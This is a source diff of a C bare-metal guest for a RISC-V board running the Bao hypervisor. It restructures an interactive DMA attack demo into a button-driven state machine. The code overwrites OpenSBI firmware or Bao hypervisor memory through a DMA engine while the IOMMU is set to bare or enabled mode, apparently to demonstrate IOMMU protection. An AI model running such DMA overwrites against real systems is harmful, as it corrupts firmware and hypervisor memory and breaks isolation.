@@ -38,6 +38,7 @@
 #define IOMMU_DDTP_MODE_BARE    (0x01ULL)
 #define IOMMU_DDTP_MODE_1LVL    (0x02ULL)
 
+// DMA parameters
 #define DMA_TRANSFER_SIZE  (16) // 4KB, i.e. page size
 
 #define DMA_CONF_DECOUPLE 0
@@ -49,61 +50,41 @@
 #define DMA_BAO_BASE_ATTACK     (0x80200000ULL)
 #define DMA_ATTACK_LOOPS        (100)
 
-#define TEST_TRAP 0
-#define TEST_PMP_SRC 0
-#define LOG_INFO 0
+// Debounce counter 
+#define DEBOUNCE_WINDOW         (1000)
 
-#define KNRM  "\x1B[0m"
-#define KRED  "\x1B[31m"
-#define KGRN  "\x1B[32m"
-#define KYEL  "\x1B[33m"
-#define KBLU  "\x1B[34m"
-#define KMAG  "\x1B[35m"
-#define KCYN  "\x1B[36m"
-#define KWHT  "\x1B[37m"
+// States
+typedef enum E_STATES
+{
+	S_RST_ATTACK = 0, S_TARGET_SEL, S_BFR_ATTACK, S_ATTACK, S_AFT_ATTACK
+} E_STATES;
+E_STATES next_state;
 
-#if LOG_INFO == 1
-#define ASSERT(expr, msg)    {         \
-    printf("ASSERT: %s %s", msg, (expr) ? KGRN "PASSED" KNRM : KRED "FAILED" KNRM); \
-    printf("\r\n");                 \
-}
-# else
-#define ASSERT(...)
-#endif
+void state_restart_attack(void);
+void state_target_selection(void);
+void state_before_attack(void);
+void state_attack(void);
+void state_after_attack(void);
 
-#define INIT(msg...)   {          \
-    printf(KBLU "INIT: " KNRM msg ); \
-    printf("\n");                 \
-}
+void (*function_pointer[])(void) = {state_restart_attack, state_target_selection, state_before_attack, state_attack, state_after_attack};
 
-#if LOG_INFO == 1
-#define INFO(msg...)   {          \
-    printf("INFO: " msg ); \
-    printf("\n");                 \
-}
-# else
-#define INFO(...)
-#endif
+// Aux counter for heart beats
+uint8_t cnt = HEART_BEAT_CNT;
 
-# define VERBOSE(str...)	{ printf("VERBOSE: " str "\n");}
+// Random index for switches
+size_t sw_idx = 0;
 
-#define BANNER\
-    ".______        ___       ______        _______  __    __   _______     _______.___________.\n"\ 
-    "|   _  \\      /   \\     /  __  \\      /  _____||  |  |  | |   ____|   /       |           |\n"\
-    "|  |_)  |    /  ^  \\   |  |  |  |    |  |  __  |  |  |  | |  |__     |   (----`---|  |----`\n"\
-    "|   _  <    /  /_\\  \\  |  |  |  |    |  | |_ | |  |  |  | |   __|     \\   \\       |  |     \n"\ 
-    "|  |_)  |  /  _____  \\ |  `--'  |    |  |__| | |  `--'  | |  |____.----)   |      |  |     \n"\ 
-    "|______/  /__/     \\__\\ \\______/      \\______|  \\______/  |_______|_______/       |__|     \n"
+// OpenSBI as default target
+uint64_t fixed_dst = (uint64_t) DMA_OPENSBI_BASE_ATTACK;
+uint64_t dst = (uint64_t) DMA_OPENSBI_BASE_ATTACK;
+uint64_t src = (uint64_t) DMA_SRC_ATTACK;
 
-                                                                                           
-
-spinlock_t print_lock   = SPINLOCK_INITVAL;
-uint8_t cnt             = HEART_BEAT_CNT;
+uint8_t lock = 0;
+uint8_t sw_match = 0;
 
 /*
 * DMA configuration registers
 */
-
 volatile uint64_t *dma_src       = (volatile uint64_t *) DMA_SRC_ADDR(0);
 volatile uint64_t *dma_dst       = (volatile uint64_t *) DMA_DST_ADDR(0);
 volatile uint64_t *dma_num_bytes = (volatile uint64_t *) DMA_NUMBYTES_ADDR(0);
@@ -128,11 +109,13 @@ void ipi_handler(){
 
 void timer_handler(){
 
-    if (!(--cnt))
+    cnt -= ((~lock) & 0x1);
+    if (!cnt)
     {
-        printf("I'm alive!\n");
+        printf("$HB$\n");
         cnt = HEART_BEAT_CNT;
     }
+
     timer_set(TIMER_INTERVAL);
     irq_send_ipi(1ull << (get_cpuid() + 1));
 }
@@ -146,22 +129,234 @@ static void set_iommu_mode(uint64_t mode)
     *iommu_ddtp = ddtp;
 }
 
+/**
+ *  Guarantee that all PBs are released
+ */
+static void check_released_pb(void)
+{
+    do {
+        // try to clean intf register
+        *dma_intf = (uint64_t) DMA_FRONTEND_INTF_ALL_BUTTONS_MASK;
+
+        // Debounce counter
+        for (int j = 0; j < DEBOUNCE_WINDOW; j++)
+            ;
+
+    } while (((*dma_intf) & DMA_FRONTEND_INTF_ALL_BUTTONS_MASK) != 0);
+}
+
+/********************************* STATES ************************************/
+
+void state_restart_attack(void)
+{
+    lock = 1;
+    printf("$GOTO$_0ddd\n");
+    lock = 0;
+
+    // Set random seed based on current cycles value
+    uint64_t cycles = timer_get();
+    srand(cycles);
+
+    // Get random indexes
+    sw_idx = rand() % (8);
+
+    next_state = S_TARGET_SEL;
+}
+
+/**
+ *  Send signal to scene 1: Target selection
+ *  Poll left and right push buttons
+ *  Configure destination address according to the selected target
+ *  Send signal to scene 2/3: Print target
+ */
+void state_target_selection(void)
+{
+    uint64_t intf = 0;
+
+    // Select a target
+	printf("$GOTO$_1ddd\n");
+
+    do {
+        // poll intf.btnl and intf.btnr bits
+        intf = *dma_intf & ((1ULL << DMA_FRONTEND_INTF_BTNL_BIT) | 
+                            (1ULL << DMA_FRONTEND_INTF_BTNR_BIT));
+    } 
+    while(!intf);
+
+    // Wait for buttons to be released
+    check_released_pb();
+
+    // Configure destination address according to the target
+    if(intf & (1ULL << DMA_FRONTEND_INTF_BTNR_BIT))
+    {
+        // Bao
+        fixed_dst = (uint64_t) DMA_BAO_BASE_ATTACK;
+        lock = 1;
+        printf("$GOTO$_2ddd\n");
+        lock = 0;        
+    }
+    else 
+    {
+        // OpenSBI
+        fixed_dst = (uint64_t) DMA_OPENSBI_BASE_ATTACK;
+        lock = 1;
+        printf("$GOTO$_3ddd\n");
+        lock = 0; 
+    }
+
+	next_state = S_BFR_ATTACK;
+}
+
+/**
+ *  Send signal to scene 4: Update labels and buttons
+ *  Poll the up button to attack, or the down button to restart the attack
+ *  Enable or disable the IOMMU according to the switches enabled
+ */
+void state_before_attack(void)
+{
+    uint64_t intf = 0;
+    uint64_t sw_status = 0;
+
+    // Select a switch and attack!
+	lock = 1;
+    printf("$GOTO$_4ddd\n");
+    lock = 0;
+
+    do {
+        // poll intf.btnu and intf.btnd register
+        intf = *dma_intf & ((1ULL << DMA_FRONTEND_INTF_BTNU_BIT) | 
+                            (1ULL << DMA_FRONTEND_INTF_BTND_BIT) |
+                            (1ULL << DMA_FRONTEND_INTF_BTNC_BIT));
+    }
+    while(!intf);
+
+    // Wait for buttons to be released
+    check_released_pb();
+
+    // clear SW bits
+    *dma_intf = DMA_FRONTEND_INT_SW_MASK;
+
+    // Change target
+    if(intf & (1ULL << DMA_FRONTEND_INTF_BTNC_BIT))
+        next_state = S_TARGET_SEL;
+
+    // Check whether the set switches disable the IOMMU
+    else
+    {
+        // Reset attack
+        if(intf & (1ULL << DMA_FRONTEND_INTF_BTND_BIT))
+            next_state = S_RST_ATTACK;
+
+        // Change target
+        else
+        {
+            // read SW status
+            sw_status = ((*dma_intf) & DMA_FRONTEND_INT_SW_MASK) >> DMA_FRONTEND_INT_SW_OFF;
+
+            // Attack succesful
+            if (sw_status & (1ULL << sw_idx))
+            {
+                lock = 1;
+                printf("$GOTO$_5%.3d\n",sw_idx);
+                lock = 0;
+                set_iommu_mode(IOMMU_DDTP_MODE_BARE);
+            }
+
+            // Attack failed
+            else
+            {
+                lock = 1;
+                printf("$GOTO$_6%.3d\n",sw_status);
+                lock = 0;
+                set_iommu_mode(IOMMU_DDTP_MODE_1LVL);
+            }
+            
+            next_state = S_ATTACK;
+        }
+    }
+}
+
+/**
+ *  Send signal to change scene: attacking
+ *  Configure the iDMA module and start the attack
+ */
+void state_attack(void)
+{
+    /*** Setup DMA transfer ***/
+    *dma_src        = (uint64_t) src;
+    *dma_num_bytes  = (uint64_t) DMA_TRANSFER_SIZE;
+    *dma_conf       = (DMA_CONF_DECOUPLE  << DMA_FRONTEND_CONF_DECOUPLE_BIT   ) |
+                      (DMA_CONF_DEBURST   << DMA_FRONTEND_CONF_DEBURST_BIT    ) |
+                      (DMA_CONF_SERIALIZE << DMA_FRONTEND_CONF_SERIALIZE_BIT  );
+
+    uint64_t dst = fixed_dst;
+
+    for (int i = 0; i < DMA_ATTACK_LOOPS; i++)
+    {
+        fence_i();
+        
+        *dma_dst = (uint64_t) dst;
+        printf("%x\n", *dma_dst);
+
+        // launch transfer: read id
+        uint64_t transfer_id = *dma_nextid;
+
+        // poll done register
+        while (*dma_done != transfer_id);
+
+        // increment for next attack
+        dst = dst + DMA_TRANSFER_SIZE;
+    }
+
+    for(int i = 0; i < 1000000; i++)
+        ;
+
+	next_state = S_AFT_ATTACK;
+}
+
+/**
+ *  Send signal to change scene: Advice user that the attack failed
+ *  Poll down button to go back
+ */
+void state_after_attack(void)
+{
+    uint64_t intf = 0;
+
+    // Attack failed!
+    lock = 1;
+    printf("$GOTO$_7ddd\n");
+    lock = 0; 
+
+    do
+    {
+        // poll intf.btnc register
+        intf = *dma_intf & ((1ULL << DMA_FRONTEND_INTF_BTNC_BIT));
+    }
+    while(!intf);
+
+    // wait for buttons to be released
+    check_released_pb();
+	
+    next_state = S_BFR_ATTACK;
+}
+
+/********************************** FSM **************************************/
+
+void encode_fsm(void)
+{
+    static E_STATES state = S_RST_ATTACK;
+    
+    function_pointer[state]();
+    state = next_state;
+}
+
+/*********************************** MAIN ************************************/
+
 void main(void){
 
     static volatile bool master_done = false;
 
-    // OpenSBI as default target
-    uint64_t dst = (uint64_t) DMA_OPENSBI_BASE_ATTACK;
-    uint64_t src = (uint64_t) DMA_SRC_ATTACK;
-
-    uint64_t intf = 0;
-
     if(cpu_is_master()){
-        spin_lock(&print_lock);
-        // printf("Bao bare-metal guest Attacker\n");
-        printf(BANNER);
-        spin_unlock(&print_lock);
-
         irq_set_handler(UART_IRQ_ID, uart_rx_handler);
         irq_set_handler(TIMER_IRQ_ID, timer_handler);
         irq_set_handler(IPI_IRQ_ID, ipi_handler);
@@ -174,133 +369,13 @@ void main(void){
     irq_set_prio(UART_IRQ_ID, IRQ_MAX_PRIO);
     irq_enable(IPI_IRQ_ID);
 
-    /*
-     * Test DMA Registers
-     */
-    
-    INFO("Test register read/write DMA\r\n");
-
-    // test register read/write
-    *dma_src = 0xDEAD;
-    *dma_dst = 0xBEEF;
-    *dma_num_bytes = 64;
-    *dma_conf = 7;   // 0b111
-
-
-    ASSERT(*dma_src == 0xDEAD, "src matches");
-    ASSERT(*dma_dst == 0xBEEF, "dst matches");
-    ASSERT(*dma_num_bytes == 64, "num_bytes matches");
-    ASSERT(*dma_conf == 7, "dma_conf matches");
+    // clear intf register
+    *dma_intf = DMA_FRONTEND_INTF_ALL_BUTTONS_MASK
+                & DMA_FRONTEND_INT_SW_MASK;
     
     /*
      * Main Attack Loop
      */
     while(1)
-    {
-
-        char attack = 255;
-        char attack_mode = 255;
-
-        /*** Attack selection ***/
-        printf("\r\nSelect attack: \n");
-        printf("\tL - Firmware attack. \n");
-        printf("\tR - Hypervisor attack. \n");
-        printf("Enter: \r\n");
-
-        do 
-        {
-            // poll intf.btnl and intf.btnr bits
-            intf = *dma_intf & ((1ULL << DMA_FRONTEND_INTF_BTNL_BIT) | 
-                                (1ULL << DMA_FRONTEND_INTF_BTNR_BIT));
-        } 
-        while(!intf);
-
-        // try to clear register until releasing all buttons
-        do
-        {
-            *dma_intf = ((1ULL << DMA_FRONTEND_INTF_BTNL_BIT) | 
-                         (1ULL << DMA_FRONTEND_INTF_BTNR_BIT) |
-                         (1ULL << DMA_FRONTEND_INTF_BTNU_BIT) | 
-                         (1ULL << DMA_FRONTEND_INTF_BTND_BIT) |
-                         (1ULL << DMA_FRONTEND_INTF_BTNC_BIT) );
-        } while (*dma_intf != 0);
-        
-
-        // setup destination address according to the target
-        if(intf & (1ULL << DMA_FRONTEND_INTF_BTNR_BIT))
-        {
-            printf("\r\nAttacking Bao \r\n");
-            dst = (uint64_t) DMA_BAO_BASE_ATTACK;
-        }
-        else 
-        {
-            printf("\r\nAttacking Firmware \r\n");
-            dst = (uint64_t) DMA_OPENSBI_BASE_ATTACK;
-        }
-
-        /*** Select protection ***/
-        printf("\r\nSelect protection: \r\n");
-        printf("\tU - with IOMMU.\r\n");
-        printf("\tD - without IOMMU.\r\n");
-        printf("Enter: \r\n");
-
-        do
-        {
-            // poll intf.btnu and intf.btnd register
-            intf = *dma_intf & ((1ULL << DMA_FRONTEND_INTF_BTNU_BIT) | 
-                                (1ULL << DMA_FRONTEND_INTF_BTND_BIT));
-        }
-        while(!intf);
-
-        // try to clear register until releasing all buttons
-        do
-        {
-            *dma_intf = ((1ULL << DMA_FRONTEND_INTF_BTNL_BIT) | 
-                         (1ULL << DMA_FRONTEND_INTF_BTNR_BIT) |
-                         (1ULL << DMA_FRONTEND_INTF_BTNU_BIT) | 
-                         (1ULL << DMA_FRONTEND_INTF_BTND_BIT) |
-                         (1ULL << DMA_FRONTEND_INTF_BTNC_BIT) );
-        } while (*dma_intf != 0);
-
-        // ack selected protection
-        if(intf & (1ULL << DMA_FRONTEND_INTF_BTND_BIT))
-        {
-            set_iommu_mode(IOMMU_DDTP_MODE_BARE);
-            printf("\r\nIOMMU disabled\n");
-        }
-        else
-        {
-            set_iommu_mode(IOMMU_DDTP_MODE_1LVL);
-            printf("\r\nIOMMU enabled\n");
-        }
-
-        /*** Setup DMA transfer ***/
-        *dma_src = (uint64_t) src;
-        *dma_num_bytes = DMA_TRANSFER_SIZE;
-        *dma_conf = (DMA_CONF_DECOUPLE  << DMA_FRONTEND_CONF_DECOUPLE_BIT   ) |
-                    (DMA_CONF_DEBURST   << DMA_FRONTEND_CONF_DEBURST_BIT    ) |
-                    (DMA_CONF_SERIALIZE << DMA_FRONTEND_CONF_SERIALIZE_BIT  );
-
-        for (int i = 0; i < DMA_ATTACK_LOOPS; i++)
-        // for ( ; ; )
-        {
-            fence_i();
-            
-            *dma_dst = (uint64_t) dst;       
-            printf("%x\n", *dma_dst);
-
-            // launch transfer: read id
-            uint64_t transfer_id = *dma_nextid;
-
-            // poll done register
-            while (*dma_done != transfer_id);
-
-            // increment for next attack
-            dst = dst + DMA_TRANSFER_SIZE;
-        }
-
-        for(int i = 0; i < 1000000; i++);
-        printf("\r\nUps... Attack Failed !! \r\n");
-        printf("Try Again :) \r\n");
-    }
+        encode_fsm();
 }
